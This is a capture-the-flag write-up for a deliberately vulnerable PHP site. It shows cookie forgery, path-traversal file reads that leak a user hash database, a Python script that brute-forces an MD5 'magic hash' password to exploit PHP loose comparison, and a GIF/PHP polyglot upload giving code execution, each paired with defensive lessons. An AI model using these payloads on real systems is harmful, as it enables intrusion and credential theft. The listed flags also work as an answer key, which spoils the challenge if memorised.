# Thinkr CTF — Full Writeup

*"Your thoughts, disordered."*

Thinkr is a small PHP social network where users post "thoughts" that are displayed in random order. It's in invite-only beta. There are 5 flags hidden across the application, each requiring a different web exploitation technique. Here's how to find them all.

---

## Flag 1 — View Source

**`flag{3nt3r-th3-m@tr1><}`**

This one's a freebie to get you warmed up.

When you first visit the site, you land on `/signin.php`. Before doing anything fancy, do what you should always do first in a web CTF: **view the page source**.

```html
<!-- flag{3nt3r-th3-m@tr1><} -->
<html>
  <head>
    <title>Sign in | Thinkr</title>
    ...
```

An HTML comment right at the top of the page. The flag is in a shared header template, so it appears on every single page — you literally cannot miss it if you check the source.

**Lesson:** Always view source. Always check comments. Developers leave things behind.

---

## Flag 2 — Cookie Monster

**`flag{nOm-n0M-t@st1e-c00K13}`**

The signin page has a link: *"Don't have an account? Get one!"* — but clicking it redirects you straight back to `/beta.php`, which says Thinkr is invite-only and you need a referral.

Open your browser's developer tools and look at the cookies. You'll see one that was just set:

```
has_referral=0
```

That's... suspicious. What if we change it?

```
has_referral=1
```

Refresh, click the signup link again, and this time you land on `/signup.php`. The page loads with a signup form and, sitting right below it:

```
flag{nOm-n0M-t@st1e-c00K13}
```

The entire "invite-only beta" access control was a single client-side cookie. The server trusted whatever value your browser sent.

**Lesson:** Never trust the client. Cookies, hidden form fields, and HTTP headers are all attacker-controlled. Authorization decisions must happen server-side.

---

## Interlude — Getting Inside

Now we can sign up and log in. But the app tells us our account needs admin approval before we can post thoughts or upload photos ("This can take 2-4 days"). We're an **unverified** user.

What *can* we do? We can browse the home page, which shows random thoughts from other users (animals like `cat`, `elephant`, `zebra`...), and click through to read individual thoughts at URLs like:

```
/read.php?thought=a8f5f167f44f4964e6c998dee827110c
```

Those thought IDs look like MD5 hashes. And they're being passed directly as a GET parameter. Interesting. Let's keep that in mind.

---

## Flag 5 (Bonus) + Setting Up Flag 3 — Path Traversal

**`flag{[_[_t3LeP@thy-1ntEn5if13s_]_]}`**

The `thought` parameter in `/read.php` takes what looks like a filename. What happens if we try a classic path traversal? The thoughts are probably stored somewhere on disk, so `../` might let us escape that directory.

Let's try reading a known file. Every PHP app has a config — and since the app lives at the web root, let's try `index.php`:

```
/read.php?thought=../index.php
```

Hmm, that might error or show the PHP source depending on how it's loaded. But we notice from the error messages or experimentation that thoughts seem to live in a `data/Thought/` subdirectory. Let's see if there's interesting data elsewhere in `data/`:

```
/read.php?thought=../User.csv
```

And there it is — the entire user database dumped onto the page:

```
FLAG,,flag{[_[_t3LeP@thy-1ntEn5if13s_]_]},true,
ant,rnf9,4aa322be200aa5d1e2be915268d572e6,true,
bull,88rw,7676e66322af43795d3e30b623499e48,true,
cat,7bqa,cf52ee958dea0b0baafb539c4eaebb37,true,
...
elephant,vunp,0e612198634316944013585621061115,true,
...
zebra,uk0q,77aeef2799d85ecd68c3f38d372335f0,true,
```

Several things jump out:

1. **The `FLAG` user** has an empty salt and its "hash" is literally `flag{[_[_t3LeP@thy-1ntEn5if13s_]_]}`. That's our bonus flag — it was hiding in plain sight in the user database.

2. The file format is `username, salt, hash, verified, photo`. Passwords are stored as `md5(salt + password)`. MD5 is weak, but brute-forcing 26 different salted hashes would take a while...

3. **Wait.** Look at `elephant`'s hash: `0e612198634316944013585621061115`. That's not just any hash. That's a *magic hash*.

**Lesson:** When a web app passes filenames or IDs as parameters, always try path traversal (`../`). Even a limited file read can blow an application wide open.

---

## Flag 3 — PHP Type Juggling

**`flag{fl0@t-l1k3-A-5tR1n9}`**

### Recognizing the magic hash

PHP has a notorious quirk with its `==` (loose comparison) operator. When comparing strings, if *both* strings look like numbers in scientific notation, PHP converts them to floats first.

The string `"0e612198634316944013585621061115"` looks like `0 × 10^612198634316944013585621061115` to PHP — which equals **0**.

If the application uses `==` to compare password hashes (instead of the strict `===`), then *any* password whose hash also starts with `0e` followed by only digits will compare as `0 == 0`, which is `true`.

### The attack

We know from `User.csv` that elephant's salt is `vunp`. We need to find a password `P` such that:

```
md5("vunp" + P) = 0e[0-9]+
```

A quick script makes short work of this:

```python
import hashlib
import itertools
import string

salt = "vunp"
charset = string.ascii_lowercase + string.digits

for length in range(1, 8):
    for combo in itertools.product(charset, repeat=length):
        password = ''.join(combo)
        h = hashlib.md5((salt + password).encode()).hexdigest()
        if h.startswith("0e") and h[2:].isdigit():
            print(f"Found! password={password}  hash={h}")
            exit()
```

This finds a collision within seconds. Now log in:

- **Username:** `elephant`
- **Password:** *(whatever your script found)*

It works. And `elephant` is a **verified** user. The home page now shows a new section at the bottom:

```
flag{fl0@t-l1k3-A-5tR1n9}
```

### Why this works

The application's password check (which we can now confirm by reading the source via our path traversal) uses `==`:

```php
if ($hash == $this->getField('hash')) {
    return TRUE;
}
```

With `===`, the strings would be compared byte-by-byte and this attack would fail. With `==`, PHP sees two "numbers" that both equal zero, and lets us in.

**Lesson:** In PHP, `==` is almost never what you want for security comparisons. Always use `===` or `hash_equals()`. The `0e` magic hash trick is one of the most famous PHP vulnerabilities — if you see a `0e[digits]` hash in a CTF, your ears should perk up immediately.

---

## Flag 4 — Unrestricted File Upload to RCE

**`flag{1M4G3-1N3-th3-p0S51b1Lit1ES}`**

### Reconnaissance

Now that we're logged in as a verified user, we have access to two new features: posting thoughts and uploading a profile photo ("Personalize"). The photo upload is at `/photo.php`.

Using our path traversal, we can read the source code to understand exactly what the upload does:

```
/read.php?thought=../photo.php
```

Wait — that's 13 characters for `../photo.php` which might exceed... actually let's check. We might need to be clever about what files we read. Through experimentation (or by reading the storage code files), we discover the thought ID has a 32-character limit. `../photo.php` is only 12 characters, so we're fine.

From reading the source, we learn:

1. The file is validated with `getimagesize()` — it must have valid image headers
2. File size must be under 500KB
3. The file must not already exist at the target path
4. The file is saved to `uploads/` using the **original filename** from the upload
5. **There is no file extension check**

### Crafting the exploit

We need a file that:
- Passes `getimagesize()` (valid image headers)
- Contains PHP code that will execute
- Has a `.php` extension

This is called a **polyglot** — a file that is valid in two formats simultaneously. The simplest approach: create a minimal valid GIF with PHP code appended.

```bash
# GIF header (GIF89a) followed by PHP code
printf 'GIF89a<?php echo file_get_contents("flagsflagsflagsflagsflagsflagsflagsflags/flag4"); ?>' > exploit.php
```

`GIF89a` is enough for `getimagesize()` to recognize it as a GIF image. But PHP will also parse and execute the `<?php ... ?>` block when the file is accessed with a `.php` extension.

But wait — how do we know the flags directory name? We can find it by reading the config:

```
/read.php?thought=../config.php
```

Which reveals:

```php
$GLOBALS['FLAGS_DIR'] = 'flagsflagsflagsflagsflagsflagsflagsflags';
```

### Pulling the trigger

1. Go to `/photo.php`
2. Upload `exploit.php`
3. Visit `/uploads/exploit.php`
4. The page displays:

```
flag{1M4G3-1N3-th3-p0S51b1Lit1ES}
```

We now have arbitrary code execution on the server. We could read any file, explore the filesystem, or pivot further — but we've already collected all the flags.

**Lesson:** `getimagesize()` is not a security function. Validating that a file "is an image" does not make it safe to store with a user-controlled filename and extension. Secure file uploads must: (1) whitelist allowed extensions, (2) generate server-side filenames, and (3) ideally store uploads outside the web root or serve them through a handler that sets `Content-Type` and `Content-Disposition` headers.

---

## Summary

| # | Flag | Technique | Difficulty |
|---|------|-----------|------------|
| 1 | `flag{3nt3r-th3-m@tr1><}` | View HTML source | Trivial |
| 2 | `flag{nOm-n0M-t@st1e-c00K13}` | Cookie manipulation | Easy |
| 5 | `flag{[_[_t3LeP@thy-1ntEn5if13s_]_]}` | Path traversal (file read) | Medium |
| 3 | `flag{fl0@t-l1k3-A-5tR1n9}` | PHP type juggling via `==` | Medium |
| 4 | `flag{1M4G3-1N3-th3-p0S51b1Lit1ES}` | Unrestricted upload → RCE | Medium-Hard |

The intended progression chains each flag into the next: viewing source gets you oriented, the cookie bypass gets you an account, the path traversal leaks the user database and source code, the leaked database reveals the type juggling target, and logging in as a verified user unlocks the file upload that gives you code execution. Each step builds on the last.

Thanks for playing!
